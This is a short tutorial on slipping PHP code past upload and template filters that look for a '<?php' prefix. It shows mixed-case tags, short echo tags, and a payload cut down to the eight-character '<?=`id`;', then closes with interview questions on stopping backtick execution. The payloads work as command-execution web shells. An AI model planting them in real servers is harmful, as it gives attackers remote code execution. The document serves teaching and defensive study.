# Simple bypass PHP

The common way of writing PHP is start with `<?` and ends with `?>`

Example:

```
<?php phpinfo();?>
```

When attempting to upload file or modify templates, often it will check if the content starts with \`\<?php\` tags

So what are the ways to bypass it?

## Method 1

Use upper and lower case

```
<?pHp system('id');?>
```

## Method 2

Replace the php starting tag with `=`

E.g.

```
<?= system('id');?>
```

## PHP Reduction Challenge: Use 8 characters to run the `id` command

Origin Command

```
<?php system('id');?>  // 21 character
```

### First reduction: PHP tags allow for being unclosed.

PHP has a feature where PHP tags are allowed to be unclosed. This means that you can use `<?php` without using `?>`, and it won't affect the execution of the PHP code.

Utilizing this feature, we can reduce the previous code as follows.

```
<?php system('id'); // 19 character
```

### Second reduction: PHP short tags.

In addition to the standard way of writing PHP tags, there are two other forms, also known as short tags.

```
<?= ?>
```

Utilizing this feature, we can reduce the previous code as follows.

```
<?= system('id'); // 17 character
```

### Third reduction: Changing the method of executing the command.

Since our goal is to successfully execute the command, is there a method that can shorten the code for executing the command? For example, is there a function that is shorter than `system`?

PHP, being a large language, of course, has functions shorter than `system` that can also execute commands.

```
eval()
popen()
exec()
....
```

These are still not short enough. The shortest of all is the backticks `` ` ` ``. PHP can execute commands using backticks.

```
system('id')  =>  `id`
```

Utilizing this feature, we can reduce the previous code as follows.

```
<?=`id`;
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Interview Question

It is interesting to see how the backticks can excute shell commands, does backticks bind to `system` function or `shell_exec` function?

Will disable this 2 functions preventing backtick from executing? If not how do you prevent it?



## Author&#x20;

[Ikonw](https://github.com/Ik0nw/)
